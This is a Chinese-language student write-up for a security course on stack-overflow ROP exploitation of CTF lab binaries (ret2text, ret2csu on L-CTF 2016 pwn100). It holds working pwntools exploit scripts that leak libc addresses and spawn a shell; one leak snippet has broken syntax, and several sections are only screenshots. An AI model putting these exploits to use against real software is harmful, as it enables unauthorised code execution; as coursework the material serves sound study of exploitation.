# software-and-system-security-HW2

# 2A: 基于栈溢出的 ROP 利用（Linux）

写出writeup就可以了。就是记录你如何发现程序的vulnerability然后怎么利用这个vulnerability构造exploit。你可以参考一下网上的writeup的写法。没有具体的格式要求的

## 要求

通过实验课，深入理解进程信息索引

+ 二进制程序 ELF/PE 的结构以及装入过程
+ 深刻理解现代操作系统的虚拟内存空间
+ 理解二进制防护手段 (编译、链接时) 及防护目的

案例：ROP 攻击原理及范例 (共 6 题)  ret2text  ret2shellcode  ret2syscall  ret2libc (由易到难，共 3 道题)

## ROP攻击范例

### ret2text

使用`checksec`查看文件ret2text，看到仅开起了NX（栈不可执行保护）。

![image-20231114154502493](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231114154502493.png)

使用IDA生成伪代码进行查看，`main()`函数中调用了`gets(&v4)`，存在溢出漏洞可以利用。在 secure 函数又发现了存在调用 system("/bin/sh") 的代码，那么如果直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。

![image-20231114162408600](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231114162408600.png)

![image-20231114163049044](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231114163049044.png)

首先需要确定的是能够控制的内存的起始地址距离 main 函数的返回地址的字节数。

![image-20231114163253649](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231114163253649.png)

可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下

![image-20231114163654207](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231114163654207.png)

则esp=0xffffd0a0，ebp=0xffffd128，因为&v4为esp+0x1c，所以有

v4的地址为0xffffd0bc，v4相对于ebp的偏移为0x6c，v4相对于返回地址的偏移为0x70.

所以攻击程序为：

```python
##!/usr/bin/env python
from pwn import *

sh = process('./ret2text')
target = 0x804863a
sh.sendline(b'A' * (0x6c+4) + p32(target))
sh.interactive()
```

运行后得到shell使用权：

![image-20231114165144304](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231114165144304.png)

### ret2shellcode

查看文件的保护措施，可以看出源程序几乎没有开启任何保护。再使用 IDA 看一下程序。

![image-20231115190718541](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231115190718541.png)

![image-20231115192544137](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231115192544137.png)

在`gets()`处仍存在栈溢出漏洞，程序中还把得到的字节复制到buf2的地址，buf2在bss段上。

![image-20231115192952800](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231115192952800.png)

![image-20231115202611654](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231115202611654.png)

通过 vmmap可以看到 bss 段对应的段具有可执行权限。那么这次就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。

![image-20231115213739204](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231115213739204.png)





### ret2syscall

![image-20231116175529781](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231116175529781.png)

源文件开启了NX保护，

![image-20231116175638989](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231116175638989.png)

可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为）0x6c。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。

data段有'/bin/sh'字符串，可以尝试利用系统调用。

![image-20231116185019134](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231116185019134.png)

![image-20231116185810270](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231116185810270.png)

![image-20231116185919501](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231116185919501.png)

![image-20231116190008785](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231116190008785.png)

![image-20231116190117834](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231116190117834.png)



### ret2libc-1

![image-20231116190247447](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231116190247447.png)

![image-20231116190443704](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231116190443704.png)

![image-20231116190534110](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231116190534110.png)

![image-20231116190810159](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231116190810159.png)

## 中级ROP：ret2csu with pwn100

### 基础：Memory Leak & DynELF - 在不获取目标libc.so的情况下进行ROP攻击

如何在获取不到目标机器上的libc.so情况下通过ROP 绕过DEP和ASLP防护？这时候就需要通过memory leak(内存泄露)来搜索内存找到system()的地址。可以采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个`leak(address)`函数，**通过这个函数可以获取到某个地址上最少1字节的数据**。leak函数应该是这样实现的：

```python
def leak(address):
    payload1 = b'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
    p.send(payload1)
    data = p.recv(4)
    print "%#x => %s" % (address, (data or '').encode('hex'))
return data
```

随后将这个函数作为参数再调用`d = DynELF(leak, elf=ELF('./[filename]'))`就可以对DynELF模块进行初始化了。然后可以通过调用`system_addr = d.lookup('system', 'libc')`来得到libc.so中system()在内存中的地址。

要注意的是，通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。通过`readelf -S [filename]`这个命令就可以获取到bss段的地址了。

因为在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个`pop pop pop ret`的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。

整个攻击过程如下：**首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”**。

在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，可以提取一些通用的gadgets加以使用，从而达到想要达到的效果。

### pwn100-WriteUp

#### 分析

使用checksec查看一下文件属性，只开启了NX保护，并用IDA看下程序功能。

![image-20231118193000560](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231118193000560.png)

![image-20231118194137738](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231118194137738.png)

![image-20231118194153058](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231118194153058.png)

![image-20231118194439829](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231118194439829.png)

sub_40068E()中有puts()函数，sub_40063D()中有read()函数，看到了明显的栈溢出漏洞，一般思路是DynELF函数的利用了。看起来程序会读取200个字符串，尝试生成250个字符并进行输入。

![image-20231118194333034](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231118194333034.png)

输入250个字符后程序报了段错误，程序终止。在sub_40063D()函数中v1传给了a1，数值200传给了a2，从标准输入中读取200字节赋值为a1指向的内存地址。但是v1到ebp只有64字节（0x40）大小，存在栈溢出问题。

![image-20231118200554506](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231118200554506.png)

因为该程序没有开启栈保护所以会直接溢出，又因为开启了NX保护所以不能直接执行shellcode。这里利用漏洞采用的是在没有提供libc版本的情况下泄露libc中函数system的地址，需要通过将`"/bin/sh\x00"`写入到程序的内存中，然后直接执行`system("/bin/sh")`。

#### 求解

用到寄存器rdi的指令地址为0x400763，程序main()函数的起始地址为0x4006b8.

![image-20231118202339654](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231118202339654.png)

![image-20231118202519639](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231118202519639.png)

0x601050 和 0x601058地址起始处分别存放了stdin stdout，覆盖此处的地址会在导致返回main函数时出错，因为main函数引用了这两个变量，再根据可写入地址判断可以使用0x601060作为写入地址。

![image-20231118213433794](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231118213433794.png)

![image-20231118203251014](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231118203251014.png)

在init()操作中，可以看到pop操作代码地址从0x40075a开始，movcall操作的地址从0x400740开始。从0x40075a代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x400740的代码我们可以将r13的值赋值给rdx，r14的值赋值给rsi，r15的值赋值给edi，随后调用call qword ptr [r12+rbx\*8]。此时只要将rbx的值赋值为0，再构造数据控制pc，就可以调用read()函数了。执行完call qword ptr [r12+rbx\*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。

![img](https://img-blog.csdnimg.cn/9572b4cc925e4a7ab5973a4765d3c7ef.jpeg)

![image-20231118214013607](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231118214013607.png)

利用read()输出read在内存中的地址。因为gadget是call qword ptr [r12+rbx\*8]，所以我们应该使用read.got的地址而不是read.plt的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。

求解过程代码如下：

```python
from pwn import *

p = process("./pwn-100")
elf = ELF("./pwn-100")

main_addr = 0x4006B8
pop_rdi_addr = 0x400763
puts_addr = elf.symbols["puts"]

def leak(addr):
    payload = cyclic(0x40 + 0x8)
    payload += p64(pop_rdi_addr) + p64(addr) + p64(puts_addr)
    payload += p64(main_addr)
    payload = payload.ljust(200, b'6')
    p.send(payload)
    p.recvuntil("bye~\n")
    data = p.recv()
 
    data = data[:-1]
    if not data:
        data = b"\x00"
    data = data[:8]
    print("puts addr: ", data)
    return data

d = DynELF(leak, elf=ELF("./pwn-100"))
system_addr = d.lookup("system", "libc")

print("----------- leak addr --------------")
print("system addr:", hex(system_addr))

print("----------- write /bin/sh to bss --------------")

str_addr = 0x601060
pop6_addr = 0x40075a   
movcall_addr = 0x400740

# --------------------- pop6_addr ---------------------
# pop     rbx    --> 0
# pop     rbp    --> 1
# pop     r12    --> func_addr
# pop     r13    --> rdx
# pop     r14    --> rsi
# pop     r15    --> rdi
# retn

# -------------------- movcall_addr -------------------
# mov     rdx, r13
# mov     rsi, r14
# mov     edi, r15d
# call    qword ptr [r12+rbx*8]

read_got = elf.got["read"]
payload = cyclic(0x40 + 0x8)
payload += p64(pop6_addr) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(str_addr) + p64(0) + p64(movcall_addr)
payload += cyclic(56)
payload += p64(main_addr)
payload =  payload.ljust(200, b'6')
p.send(payload)
p.recvuntil(b"bye~\n")
p.send("/bin/sh\x00")

print("----------- get shell --------------")
payload = cyclic(0x40 + 0x8)
payload += p64(pop_rdi_addr) + p64(str_addr) + p64(system_addr)
payload += p64(main_addr)
payload =  payload.ljust(200, b'6')
p.send(payload)
p.interactive()
```

#### 运行结果

![image-20231118215557535](C:/Users/Anne/AppData/Roaming/Typora/typora-user-images/image-20231118215557535.png)

## 参考

[基本 ROP - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/)

[中级ROP - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/)

[有道云笔记 (youdao.com)](https://note.youdao.com/ynoteshare/index.html?id=dbfe9805a30f34e1a9916e3b7010f54f)

[linux漏洞利用之 -- ROP探究 - Carter的博客 | Carter Blog (cartermgj.github.io)](https://cartermgj.github.io/2016/11/18/rop-summary/)

[Lctf-2016-pwn100 题解_2016 xdctf pwn100-CSDN博客](https://blog.csdn.net/A951860555/article/details/111638914)

[[漏洞利用\]一步一步学ROP之linux_x86篇(蒸米spark) - VxerLee昵称已被使用 - 博客园 (cnblogs.com)](https://www.cnblogs.com/VxerLee/p/15424336.html)

[一步一步学ROP之linux_x64篇 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/23537552)

[pwn-100（L-CTF-2016）--write up-CSDN博客](https://atfwus.blog.csdn.net/article/details/104791561?spm=1001.2101.3001.6650.4&utm_medium=distribute.pc_relevant.none-task-blog-2~default~ESLANDING~default-4-104791561-blog-111638914.pc_relevant_landingrelevant&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~ESLANDING~default-4-104791561-blog-111638914.pc_relevant_landingrelevant&utm_relevant_index=9)

[pwn-100（L-CTF-2016）的个人想法(含DynELF的使用)_cccsl_的博客-CSDN博客](https://blog.csdn.net/fzucaicai/article/details/129043468)